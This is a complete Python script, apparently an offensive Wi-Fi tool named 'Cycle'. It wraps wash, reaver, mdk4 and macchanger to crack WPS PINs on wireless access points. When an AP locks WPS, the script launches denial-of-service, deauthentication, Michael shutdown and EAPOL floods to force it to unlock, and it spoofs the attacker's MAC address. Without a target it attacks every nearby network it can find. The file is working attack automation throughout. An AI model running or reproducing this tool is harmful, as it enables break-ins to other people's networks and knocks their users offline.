import datetime
import re
import subprocess
import sys
import threading
import time
from argparse import ArgumentParser
from shutil import which

import pexpect
import psutil as psutil
from art import text2art
from loguru import logger

from dateutils import pretty_time_delta

wash_regex = r'^((?:[A-Z0-9]{2}:){5}[A-Z0-9]{2})\s+(\d{1,2})\s+(-?\d{1,2})\s+(1\.0|2\.0)\s+(Yes|No)\s+(\w+)?\s+(.*)'
blacklist_filename = 'blacklist.txt'
rate_limiting_msg = 'WARNING: Detected AP rate limiting'
ON_POSIX = 'posix' in sys.builtin_module_names

num_dos_attacks = 0


def run_wash(channel, interface):
    wash_args = ['wash', '-i', interface]
    if channel:
        wash_args.extend(['-c', str(channel)])
    return subprocess.Popen(wash_args, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)


def run_reaver(interface, no_nacks, channel, bssid, small):
    reaver_args = ['reaver', '-i', interface, '-b', bssid, '-vv']
    if no_nacks:
        reaver_args.append('-N')

    if small:
        reaver_args.append('-S')

    if channel:
        reaver_args.extend(['-c', str(channel)])

    return subprocess.Popen(reaver_args, stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)


def run_mdk4_deauth(bssid, interface, channel):
    logger.debug('Starting deauth')
    mdk4_args = ['mdk4', interface, 'd', '-b', blacklist_filename]
    with open(blacklist_filename, 'w') as f:
        f.write(bssid)
    if channel:
        mdk4_args.extend(['-c', str(channel)])
    return subprocess.Popen(mdk4_args, stdout=subprocess.PIPE)


def run_mdk4_dos(bssid, interface):
    logger.debug('Starting DoS')
    mdk4_args = ['stdbuf', '-oL', '-eL', 'mdk4', interface, 'a', '-m', '-i', bssid]
    return subprocess.Popen(mdk4_args, stdout=subprocess.PIPE, bufsize=1, close_fds=ON_POSIX)


def run_mdk4_michael_shutdown(bssid, interface):
    logger.debug('Starting Michael')
    mdk4_args = ['mdk4', interface, 'm', '-t', bssid]
    return subprocess.Popen(mdk4_args, stdout=subprocess.PIPE)


def run_mdk4_eapol_start(bssid, interface):
    logger.debug('Starting EAPOL')
    mdk4_args = ['mdk4', interface, 'e', '-t', bssid]
    return subprocess.Popen(mdk4_args, stdout=subprocess.PIPE)


def get_wash_output(x):
    search = re.search(wash_regex, x.decode('utf-8'))
    return {'bssid': (search.group(1)), 'channel': (search.group(2)), 'strength': (search.group(3)),
            'wps_version': (search.group(4)),
            'locked': (search.group(5) == 'Yes'), 'vendor': (search.group(6)), 'essid': (search.group(7))}


def extract_mass_wash_networks(wash_scanned):
    return sorted(filter(lambda y: -int(y['strength']) > 10, wash_scanned),
                  key=lambda x: (x['locked'], -int(x['strength'])))


def run_cycle(bssid, wait_time, channel, wash_time, interface, no_nacks, small, mac_info, attacks):
    print(text2art('Cycle'))
    # print(wikiquote.quote_of_the_day())  # TODO: Think of a performant way to include something clever

    logger.info('Scanning like a boss')
    wash_scanned = handle_wash(channel, interface, wash_time)
    logger.debug(wash_scanned)

    if bssid:
        found_network = extract_wash_network(bssid, wash_scanned)
        if not found_network:
            logger.error(f'BSSID "{bssid}" not found')
            return
        attack_one(found_network, interface, no_nacks, small, wait_time, wash_time, mac_info, attacks)
    else:
        mass_attack_networks = extract_mass_wash_networks(wash_scanned)
        logger.info(f'Running Massive Attack ;) on {len(mass_attack_networks)} networks')
        for n in mass_attack_networks:
            attack_one(n, interface, no_nacks, small, wait_time, wash_time, mac_info, attacks)


def store_dos_attack_count(p_dos):
    global num_dos_attacks
    for line in iter(p_dos.stdout.readline, b''):
        decoded_line = line.decode()
        for splitline in map(lambda x: x.strip(), decoded_line.splitlines()):
            if splitline:
                logger.trace(splitline)
        match = re.search(r'Packets sent:\s+(\d+)', decoded_line)
        if match:
            num_dos_attacks = int(match.group(1))


def attack_one(found_network, interface, no_nacks, small, wait_time, wash_time, mac_info, attacks):
    global num_dos_attacks
    num_dos_attacks = 0

    spoof_mac, mac_address = mac_info
    if spoof_mac and mac_address:
        new_mac = change_mac(interface, mac_address)
        if new_mac:
            logger.info(f'Using custom MAC: {new_mac}')
        else:
            return

    bssid = found_network['bssid']
    channel = found_network['channel']

    attack_dos = attacks['dos']
    attack_deauth = attacks['deauth']
    attack_michael = attacks['michael']
    attack_eapol = attacks['eapol']

    logger.info(f'Attacking {found_network["essid"]} ({found_network["bssid"]})')
    is_locked = False
    latest_network = None
    while True:
        if spoof_mac and not mac_address:
            new_mac = change_mac(interface)
            if new_mac:
                logger.info(f'Fresh, shiny MAC: {new_mac}')
            else:
                return
        else:
            new_mac = None

        if is_locked and not latest_network:  # first iteration has already run and waited for network to reappear - check again
            logger.info('Scanning again')
            wash_scanned = handle_wash(channel, interface, wash_time)
            latest_network = extract_wash_network(bssid, wash_scanned)
            is_locked = latest_network['locked']

        if is_locked:  # possibly the first iteration - are we still locked?
            logger.warning('Our friend is locked - attack tools to the rescue!')
            last_num_dos_attacks = 0
            p_dos = None
            t_dos = None
            if attack_dos:
                p_dos = run_mdk4_dos(bssid, interface)
                t_dos = threading.Thread(target=store_dos_attack_count, args=(p_dos,))
                t_dos.daemon = True
                t_dos.start()

            p_deauth = run_mdk4_deauth(bssid, interface, channel) if attack_deauth else None
            p_michael = run_mdk4_michael_shutdown(bssid, interface) if attack_michael else None
            p_eapol = run_mdk4_eapol_start(bssid, interface) if attack_eapol else None

            attack_start_time = datetime.datetime.now()
            last_num_dos_check = datetime.datetime.now()

            while True:
                time.sleep(wait_time)
                wash_scanned = handle_wash(channel, interface, wash_time)
                latest_network = extract_wash_network(bssid, wash_scanned)
                is_locked = latest_network and latest_network['locked']
                if not latest_network:
                    logger.warning(f'Network {bssid} not found')
                    break
                if not is_locked:
                    logger.success('Unlocked. Magic. Let\'s ride.')
                    break

                attack_elapsed = datetime.datetime.now() - attack_start_time
                attacks_per_sec = (num_dos_attacks - last_num_dos_attacks) // (
                        datetime.datetime.now() - last_num_dos_check).total_seconds()
                avg_cpu = int(psutil.getloadavg()[0] * 100 // psutil.cpu_count())
                dos_log_line = f' ({format(num_dos_attacks, ",")} DoS attacks) ({format(attacks_per_sec, ",")} a/s)' if attack_dos else ''
                locked_log_line = f'Still locked ({pretty_time_delta(attack_elapsed.total_seconds())}) ({avg_cpu}% CPU){dos_log_line}'
                logger.warning(locked_log_line)
                last_num_dos_attacks = num_dos_attacks
                last_num_dos_check = datetime.datetime.now()

            logger.info('Stopping attack tools')
            if attack_dos and p_dos and p_dos.poll() is None:
                logger.debug('Killing DoS')
                p_dos.kill()
                t_dos.join()

            for should_attack, popen, name in zip((attack_deauth, attack_michael, attack_eapol),
                                                  (p_deauth, p_michael, p_eapol), ('deauth', 'Michael', 'EAPOL')):
                if should_attack and popen and popen.poll() is None:
                    logger.debug(f'Killing {name}')
                    popen.kill()

        if is_locked:
            dead_wait_time = 30
            logger.info(f'Network appears dead - waiting {dead_wait_time}s')
            continue

        reaver_result = handle_reaver(bssid, channel, interface, no_nacks, small,
                                      new_mac)
        if reaver_result:
            print(text2art('YES!', font='block', chr_ignore=True))
            logger.success('Title of your sex tape.')
            return True
        else:
            is_locked = True


def change_mac(interface, address=None):
    ifdown_args = ['ifconfig', interface, 'down']
    completed_ifdown = subprocess.run(ifdown_args)
    if completed_ifdown.returncode:
        logger.error('Failed to bring {interface} down during MAC change')
        return False

    mac_changer_args = ['macchanger']
    if address:
        mac_changer_args.extend(['-m', address])
    else:
        mac_changer_args.append('r')
    mac_changer_args.append(interface)

    completed_mac_changer = subprocess.run(mac_changer_args, encoding='utf-8', stdout=subprocess.PIPE)
    macchanger_text = completed_mac_changer.stdout
    logger.debug('macchanger reported: {}', macchanger_text)
    new_mac = re.search(r'New MAC: \s+([a-z0-9:]{17})', macchanger_text).group(1).upper() if macchanger_text else None
    if completed_mac_changer.returncode and not new_mac:
        logger.error(f'Failed to change MAC - attempting to bring {interface} back up')

    if not new_mac:
        logger.error(f'Failed to read new MAC - attempting to bring {interface} back up')

    ifup_args = ['ifconfig', interface, 'up']
    completed_ifup = subprocess.run(ifup_args)
    if completed_ifup.returncode:
        logger.error('Failed to bring {interface} up during MAC change')
        return False

    return new_mac


def handle_reaver(bssid, channel, interface, no_nacks, small, new_mac):
    logger.info('Starting Reaver...')
    reaver_args = ['reaver', '-i', interface, '-b', bssid, '-vv']

    if new_mac:
        reaver_args.extend(['-m', new_mac])

    if no_nacks:
        reaver_args.append('-N')

    if small:
        reaver_args.append('-S')

    if channel:
        reaver_args.extend(['-c', str(channel)])

    c_reaver = pexpect.spawn(' '.join(reaver_args), encoding='utf-8', ignore_sighup=False)
    c_reaver.logfile = sys.stdout
    try:
        c_reaver.expect('Restore previous session.*', timeout=5)
        c_reaver.sendline('Y')
        c_reaver.expect('Restored previous session', timeout=5)
    except pexpect.TIMEOUT:
        pass

    if c_reaver.expect(['Pin cracked', 'Detected AP rate limiting'], timeout=None):  # only returns false if idx >= 1
        c_reaver.sendcontrol('c')
        c_reaver.expect('Session saved')
        return False
    logger.success('Reaver finished without complaining. Optimistically quitting.')
    return True


def extract_wash_network(bssid, wash_scanned):
    return next((w for w in wash_scanned if w['bssid'] == bssid), None)


def handle_wash(channel, interface, wash_time):
    p_wash = run_wash(channel, interface)
    time.sleep(wash_time)
    p_wash.kill()
    wash_output = p_wash.stdout.readlines()[2:]
    wash_scanned = list(map(get_wash_output, wash_output))
    return wash_scanned


def process_args():
    parser = ArgumentParser()
    parser.add_argument('-b', '--bssid', type=str, help='BSSID of target network')
    parser.add_argument('-w', '--wait-time', type=int, default=60,
                        help='time (secs) to wait between lock checks when attacking')
    parser.add_argument('-c', '--channel', type=int, help='channel of target BSSID(s)')
    parser.add_argument('-N', '--send-nacks', action='store_true',
                        help='sending NACKS - disabled by default to speed up some attacks')
    parser.add_argument('-S', '--small', action='store_true',
                        help='enables small subgroup confinement attack on Diffie-Hellman')
    parser.add_argument('-i', '--interface', type=str, default='wlan0mon',
                        help='the interface to use in attacks (default: wlan0mon)')
    parser.add_argument('-v', '--verbose', action='store_true', help='show (and log) more detailed output')
    parser.add_argument('-s', '--spoof-mac', action='store_true', help='use a spoofed MAC (random if -m not provided)')
    parser.add_argument('-m', '--mac-address', type=str, help='the fake MAC to use with -s')
    parser.add_argument('-1', '--dos', action='store_true', help='run DoS attacks when AP locked')
    parser.add_argument('-2', '--deauth', action='store_true', help='run deauth attacks when AP locked')
    parser.add_argument('-3', '--michael', action='store_true', help='run Michael attacks when AP locked')
    parser.add_argument('-4', '--eapol', action='store_true', help='run EAPOL attacks when AP locked')
    parser.add_argument('-9', '--random-attacks', metavar='MINS', type=int,
                        help='cycle through random attacks at this set interval (mins)')
    return parser.parse_args()


def check_requirements():
    requirements = ['mdk4', 'reaver', 'wash', 'macchanger']
    for r in requirements:
        req_exists = which(r)
        if req_exists:
            logger.debug(f'{r} found')
        else:
            logger.error(f'{r} missing - please install before running Cycle')
            return False

    return True


def configure_logging(verbose, bssid: str):
    logger_format = '<green>{time:HH:mm:ss}</green> | <level>{level: <8}</level> | <level>{message}</level>'
    logger.remove()
    logger_level = ('DEBUG' if verbose else 'INFO')
    logger.add(sys.stderr, format=logger_format, level=logger_level)
    bssid_string = f'_{bssid}' if bssid else ''
    logger.add(f'cycle_logs/cycle_{{time:YYYY-MM-DD_HH-mm-ss}}{bssid_string.replace(":", "-")}.log',
               format='{time} | {level} | {message}', level=logger_level, rotation='100 MB')


def main():
    args = process_args()
    configure_logging(args.verbose, args.bssid)
    if check_requirements():
        any_attacks = args.dos or args.deauth or args.michael or args.eapol
        attack_dos = args.dos if any_attacks else True
        if attack_dos:
            logger.info('DoS attack selected')
        attack_deauth = args.deauth if any_attacks else False
        if attack_deauth:
            logger.info('Deauth attack selected')
        attack_michael = args.michael if any_attacks else False
        if attack_michael:
            logger.info('Michael attack selected')
        attack_eapol = args.eapol if any_attacks else False
        if attack_eapol:
            logger.info('EAPOL attack selected')

        attacks = {'dos': attack_dos,
                   'deauth': attack_deauth,
                   'michael': attack_michael,
                   'eapol': attack_eapol}
        run_cycle(args.bssid, args.wait_time, args.channel, 5, args.interface, not args.send_nacks, args.small,
                  (args.spoof_mac, args.mac_address), attacks)


if __name__ == '__main__':
    main()
